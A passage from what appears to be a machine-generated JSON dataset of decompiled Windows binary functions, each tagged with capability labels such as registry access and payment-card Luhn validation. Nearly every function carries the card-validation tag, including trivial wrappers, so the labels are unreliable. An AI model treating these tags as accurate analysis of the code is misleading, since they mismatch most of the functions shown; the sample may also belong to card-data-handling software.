uStack32 = 0x41eb32;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 365
    },
    "0041ee48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0041ee48(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041ee48::var_1h + 1;\n    uStack36 = 0x41eee0;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.0041ee48::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x28))();\n        fcn.0041e964();\n        fcn.0041e964();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.0041cbbc();\n        if (cVar2 != '\\0') break;\n        fcn.0041ee00();\n        puVar1 = puStack32;\n    }\n    fcn.0041dc78();\n    while( true ) {\n        cVar2 = fcn.0041cbbc();\n        if (cVar2 != '\\0') break;\n        fcn.0041ee48();\n    }\n    fcn.0041dc78();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41eee7;\n    uStack36 = 0x41eedf;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 409
    },
    "0041f05c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f05c(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.0041cfd8();\n                param_2 = 0;\n            }\n            else {\n                fcn.0041cfd8();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 116
    },
    "0041f0a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f0a4(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f24d;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x41f0d0;\n    fcn.0041ca74();\n    puStack52 = 0x41f0e1;\n    fcn.00404620();\n    uStack56 = 0x41f228;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00404620();\n    fcn.0041cfd8();\n    fcn.0041b788(var_18h, var_18h >> 0x1f);\n    fcn.0041cfd8();\n    puStack76 = 0x41f14a;\n    fcn.0041c308(0x400);\n    uStack80 = 0x41f203;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041e9a0();\n    fcn.0041cfd8();\n    fcn.0041b788(var_18h, var_18h >> 0x1f);\n    fcn.0041cfd8();\n    cVar1 = fcn.00416224();\n    if (cVar1 != '\\0') {\n        fcn.0040700c();\n        cVar1 = fcn.0040f968();\n        if (cVar1 != '\\0') goto code_r0x0041f1d6;\n    }\n    fcn.0040dba8();\n    fcn.00404ec4();\ncode_r0x0041f1d6:\n    *in_EAX = *(var_1ch + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_18h;\n    iStack84 = 0x41f20a;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 635
    },
    "0041f9b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041f9b4(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x41f9cd;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    uStack52 = 0x41fa5e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &fcn.0041f9b4::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.00404620();\n    fcn.0041f71c();\n    *(in_EAX + 0xe) = param_1;\n    *(in_EAX + 0xc) = param_1;\n    iVar1 = fcn.004054b4(in_EAX + 8, 4, in_EAX);\n    *(in_EAX + 4) = iVar1;\n    if (iVar1 == 0) {\n        sub.kernel32.dll_GetLastError_1();\n        fcn.0040d2d8();\n        var_ch = 0;\n        var_8h._0_1_ = 0xb;\n        in_stack_ffffffb4 = 0;\n        fcn.0040dbe4(0, &fcn.0041f9b4::var_ch);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00405530(0x41fa65);\n    return;\n}\n",
        "token_count": 486
    },
    "0041fb04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fb04(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41fb72;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 != 0) {\n        fcn.0040d2d8();\n        var_10h = 0;\n        var_ch._0_1_ = 0xb;\n        var_4h._0_1_ = 0;\n        in_stack_ffffffd0 = 1;\n        var_8h = param_2;\n        fcn.0040dbe4(1, &var_10h);\n        fcn.00404ec4();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x41fb79;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 329
    },
    "0041ff44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ff44(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x41ff8c;\n    if (param_1 != 0) {\n        fcn.00420100();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "004204b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004204b4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.00405974();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00409c48();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040dbe4(0, &iStack20);\n                fcn.00404ec4();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.00420638();\n        fcn.00420544();\n        fcn.00420638();\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00420638": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420638(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.004057e8();\n        piVar1 = fcn.00404924();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00420868": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420868(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff44();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "00420a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420a60(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 185
    },
    "00420fdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420fdc(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 66
    },
    "004215ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004215ac(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040dbe4(0, auStack12);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 63
    },
    "00421644": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421644(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00421720();\n    *(in_EAX + 0x18) = 0xf003f;\n    *(in_EAX + 0xc) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 163
    },
    "00421688": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421688(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00421644();\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "00421788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00421788(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x421854;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    hKey = 0;\n    fcn.004055c8();\n    cVar1 = fcn.004215d8();\n    if (cVar1 == '\\0') {\n        fcn.00405a84();\n    }\n    uVar2 = fcn.004059dc(0, 0, 0, 0xf003f, 0, &fcn.00421788::hKey, &fcn.00421788::var_ch);\n    uVar2 = fcn.00421770(uVar2);\n    iVar3 = sub.advapi32.dll_RegCreateKeyExA(uVar2);\n    if (iVar3 == 0) {\n        uVar2 = 0x421818;\n        sub.advapi32.dll_RegCloseKey_1(hKey);\n    }\n    else {\n        var_10h._0_1_ = 0xb;\n        uVar2 = 0;\n        var_14h = param_2;\n        fcn.0040dbe4(0, &fcn.00421788::var_14h);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x42185b);\n    return;\n}\n",
        "token_count": 430
    },
    "00421d58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421d58(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421e10;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.00421cf0();\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        if (-1 < var_28h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_24h + 1;\n                uVar2 = fcn.004059dc(&fcn.00421d58::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumKeyExA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004059dc();\n                fcn.00405728();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x421e17;\n    uStack68 = 0x421e07;\n    fcn.00405530();\n    uStack68 = 0x421e0f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 471
    },
    "00421e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421e20(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421ed8;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.00421cf0();\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        if (-1 < var_20h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_1ch + 1;\n                uVar2 = fcn.004059dc(&fcn.00421e20::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumValueA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004059dc();\n                fcn.00405728();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x421edf;\n    uStack68 = 0x421ecf;\n    fcn.00405530();\n    uStack68 = 0x421ed7;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 476
    },
    "00421f38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421f38(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uStack12;\n    \n    cVar1 = fcn.00421ee8();\n    uVar2 = uStack12;\n    if (cVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 88
    },
    "00421f60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421f60(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uStack16;\n    uint uStack12;\n    \n    cVar1 = fcn.00421ee8();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = uStack16;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 102
    },
    "00422108": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422108(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004215ec();\n    uVar1 = fcn.004059dc(0, uVar1, var_4h, arg_ch);\n    iVar2 = sub.advapi32.dll_RegSetValueExA(*(in_EAX + 4), uVar1);\n    if (iVar2 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040dbe4(0, &var_ch);\n        fcn.00404ec4();\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00422170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00422170(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = fcn.004059dc(0, &var_4h);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(*(in_EAX + 4), uVar2);\n    if (iVar3 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040dbe4(0, &var_ch);\n        fcn.00404ec4();\n    }\n    uVar1 = fcn.0042161c();\n    *arg_8h = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 218
    },
    "004221e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004221e4(void)\n\n{\n    fcn.00421ee8();\n    return;\n}\n",
        "token_count": 25
    },
    "004221f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004221f4(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x42227a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.004055c8();\n    cVar1 = fcn.004215d8();\n    if (cVar1 == '\\0') {\n        fcn.00405a84();\n    }\n    var_8h = 0;\n    uVar2 = fcn.004059dc(0, *(in_EAX + 0x18), &var_8h);\n    uVar2 = fcn.00421770(uVar2);\n    sub.advapi32.dll_RegOpenKeyExA_1();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x422281);\n    return;\n}\n",
        "token_count": 265
    },
    "0042228c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042228c(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uVar1 = *(in_EAX + 0x18);\n    uStack28 = 0x4222f1;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *(in_EAX + 0x18) = uVar1 & 0x300 | 0x20009;\n    iStack36 = 0x4222c8;\n    iVar2 = fcn.004221f4();\n    if (iVar2 != 0) {\n        sub.advapi32.dll_RegCloseKey_1();\n        iStack36 = iVar2;\n    }\n    *in_FS_OFFSET = iStack36;\n    *(in_EAX + 0x18) = uVar1;\n    return;\n}\n",
        "token_count": 262
    },
    "00422304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422304(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint8_t var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(*(arg_8h + -4) + 4);\n    puStack36 = 0x422329;\n    fcn.00421784();\n    uStack40 = 0x422417;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x422344;\n    puStack36 = &stack0xfffffffc;\n    arg_ch = fcn.00421f38();\n    if (0 < arg_ch) {\n        puStack48 = 0x422355;\n        var_10h = fcn.00402ee8();\n        uStack52 = 0x4223f4;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        puStack68 = 0x42237b;\n        puStack48 = &stack0xfffffffc;\n        arg_ch_00 = fcn.00422170(&stack0xffffffeb, arg_ch);\n        var_ch = *(*(arg_8h + -4) + 4);\n        puStack68 = 0x422397;\n        fcn.00421784();\n        uStack72 = 0x4223d7;\n        uStack76 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb4;\n        arg_8h_00 = var_11h;\n        puStack68 = &stack0xfffffffc;\n        fcn.00422108(arg_8h_00, arg_ch_00);\n        *in_FS_OFFSET = arg_8h_00;\n        uStack76 = 0x4223de;\n        fcn.00421784();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42241e;\n    uStack40 = 0x422416;\n    fcn.00421784();\n    return;\n}\n",
        "token_count": 572
    },
    "00422424": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422424(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x42253b;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x422461;\n    fcn.00421784();\n    uStack84 = 0x422516;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    cVar1 = fcn.00421cf0();\n    if (cVar1 != '\\0') {\n        fcn.00422304(arg_8h);\n        fcn.00405620();\n        if (-1 < var_24h + -1) {\n            do {\n                var_ch = var_20h + 1;\n                fcn.004059dc(&fcn.00422424::var_ch, 0, 0, 0, 0);\n                iVar2 = sub.advapi32.dll_RegEnumValueA();\n                if (iVar2 == 0) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004059dc();\n                    fcn.00405728();\n                    fcn.00422304(arg_8h_00);\n                }\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x42251d;\n    uStack84 = 0x422515;\n    fcn.00421784();\n    return;\n}\n",
        "token_count": 510
    },
    "00423840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423840(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (in_EAX != *0x4979fc)) {\n        sub.gdi32.dll_DeleteObject();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "0042393c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042393c(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "0042399c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042399c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "004239a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004239a8(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00423b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423b5c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x423b75;\n    fcn.0042399c();\n    uStack32 = 0x423bc5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.004239b4();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.0040484c();\n    }\n    fcn.00423a98();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x423bcc;\n    uStack32 = 0x423bc4;\n    fcn.004239a8();\n    return;\n}\n",
        "token_count": 263
    },
    "00423cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
